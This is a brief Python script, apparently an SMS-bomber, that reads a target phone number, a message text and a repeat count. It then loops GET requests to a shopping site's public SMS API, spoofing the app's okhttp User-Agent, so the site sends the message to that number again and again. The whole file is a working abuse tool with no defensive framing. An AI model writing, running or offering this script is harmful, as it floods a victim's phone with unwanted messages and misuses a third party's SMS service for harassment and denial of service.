import requests
from requests.structures import CaseInsensitiveDict

number = str(input("NUMBER : "))
SMS = str(input("MESSAGE : "))
amount = int(input("AMOUNT : "))

url = "https://shopapp.self-shopping.com/public/smsapi?mobile="+number+"&msg="+SMS+"&random=123456"
headers = CaseInsensitiveDict()
headers["User-Agent"] = "okhttp/4.9.2"
for i in range(amount):
    resp = requests.get(url, headers=headers)
    print (resp.text)